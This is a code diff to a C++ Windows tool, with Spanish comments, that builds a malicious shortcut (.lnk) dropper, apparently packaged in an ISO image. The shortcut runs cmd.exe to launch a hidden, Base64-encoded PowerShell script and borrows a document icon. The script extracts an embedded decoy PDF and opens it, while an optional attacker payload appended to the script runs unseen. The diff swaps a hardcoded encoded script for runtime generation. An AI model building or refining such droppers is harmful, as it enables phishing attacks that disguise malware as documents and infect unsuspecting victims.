@@ -16,26 +16,61 @@
 #pragma comment(lib, "shell32.lib")
 
 //------------------------------------------------------------------------------
-// Script PowerShell precomputado como literal ancho (Base64 UTF‑16LE constante)
-// Se incrusta directamente en .rdata, 0 conversiones en tiempo de ejecución.
+// Generación dinámica del script PowerShell (Base64 UTF-16LE)
 //------------------------------------------------------------------------------
-constexpr wchar_t PS_SCRIPT_B64[] = L"JABsAG4AawBQAGEAdABoACAAPQAgACQATQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4ALgBNAHkAQwBv"
-    L"AG0AbQBhAG4AZAAuAFAAYQB0AGgAOwAgACQAYgB5AHQAZQBzACAAPQAgAFsAUwB5AHMAdABlAG0A"
-    L"LgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABsAG4AawBQ"
-    L"AGEAdABoACkAOwAgACQAbQBhAHIAawBlAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQA"
-    L"LgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBQ"
-    L"AEQARgBTAFQAQQBSAFQAOgAnACkAOwAgACQAaQBkAHgAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEEA"
-    L"cgByAGEAeQBdADoAOgBMAGEAcwB0AEkAbgBkAGUAeABPAGYAKAAkAGIAeQB0AGUAcwAsACAAJABt"
-    L"AGEAcgBrAGUAcgApADsAIABpAGYAIAAoACQAaQBkAHgAIAAtAGcAZQAgADAAKQAgAHsAIAAkAHAA"
-    L"ZABmAEIAdABlAHMAIAA9ACAAJABiAHkAdABlAHMAWwAoACQAaQBkAHgAKwAkAG0AYQByAGsAZQBy"
-    L"AC4ATABlAG4AZwB0AGgAKQAuAC4AKAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoAC0AMQApAF0A"
-    L"OwAgACQAcABkAGYAUABhAHQAaAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABhAHQAaABd"
-    L"ADoAOgBHAGUAdABUAGUAbQBwAEYAaQBsAGUALgB0AHgAdAAgACsAIAAiAGQAZQBjAG8AeQAuAHAA"
-    L"ZABmACIAOwAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBB"
-    L"AGwAbABCACEAeQBsAHQAZQBtAHMAKAAkAHAAZABmAFAAYQB0AGgALAAgACQAcABkAGYAQgB0AGUA"
-    L"cwAsACAAVAByAHUAZQApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABwAGQAZgBQ"
-    L"AGEAdABoADsAIAB9ACAAIwAgAFAAYQB5AGwAbwBhAGQAIAByAGUAYQBsACAAYQBxAHUA7QAgACgA"
-    L"bwBtAGkAdABpAGQAbwApAA==";
+
+std::wstring Base64EncodeUTF16LE(const std::wstring& input) {
+    std::vector<uint8_t> bytes;
+    for (wchar_t ch : input) {
+        bytes.push_back(static_cast<uint8_t>(ch & 0xFF));
+        bytes.push_back(static_cast<uint8_t>(ch >> 8));
+    }
+    
+    static const char* b64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string encoded;
+    int i = 0;
+    uint8_t char_array_3[3];
+    uint8_t char_array_4[4];
+
+    for (uint8_t byte : bytes) {
+        char_array_3[i++] = byte;
+        if (i == 3) {
+            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+            char_array_4[3] = char_array_3[2] & 0x3f;
+            for (i = 0; (i < 4); i++) encoded += b64_chars[char_array_4[i]];
+            i = 0;
+        }
+    }
+
+    if (i) {
+        int j = i;
+        for (; j < 3; j++) char_array_3[j] = '\0';
+        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+        for (j = 0; (j < i + 1); j++) encoded += b64_chars[char_array_4[j]];
+        while ((i++ < 3)) encoded += '=';
+    }
+
+    return std::wstring(encoded.begin(), encoded.end());
+}
+
+std::wstring BuildDynamicScript(const std::wstring& psPayload = L"") {
+    std::wstring tmpl = L"$lnkPath = $MyInvocation.MyCommand.Path; "
+                        L"$bytes = [System.IO.File]::ReadAllBytes($lnkPath); "
+                        L"$marker = [System.Text.Encoding]::ASCII.GetBytes('PDFSTART:'); "
+                        L"$idx = [System.Array]::LastIndexOf($bytes, $marker); "
+                        L"if ($idx -ge 0) { "
+                        L"$pdfBytes = $bytes[($idx+$marker.Length)..($bytes.Length-1)]; "
+                        L"$pdfPath = [System.IO.Path]::GetTempFileName() + '.pdf'; "
+                        L"[System.IO.File]::WriteAllBytes($pdfPath, $pdfBytes); "
+                        L"Start-Process $pdfPath; "
+                        L"} ";
+    if (!psPayload.empty()) tmpl += psPayload;
+    return Base64EncodeUTF16LE(tmpl);
+}
 
 //------------------------------------------------------------------------------
 // Constantes ISO 9660 y estructuras precalculadas (ECMA‑119)
@@ -187,7 +222,8 @@ struct ComGuard {
         return result;
 
     pLink->SetPath(L"cmd.exe");
-    pLink->SetArguments((std::wstring(L" /c powershell -WindowStyle Hidden -EncodedCommand ") + PS_SCRIPT_B64).c_str());
+    std::wstring dynamicScript = BuildDynamicScript();
+    pLink->SetArguments((std::wstring(L" /c powershell -WindowStyle Hidden -EncodedCommand ") + dynamicScript).c_str());
     pLink->SetIconLocation(L"%SystemRoot%\\System32\\imageres.dll", 29);
     pLink->SetShowCmd(SW_SHOWMINNOACTIVE);
 
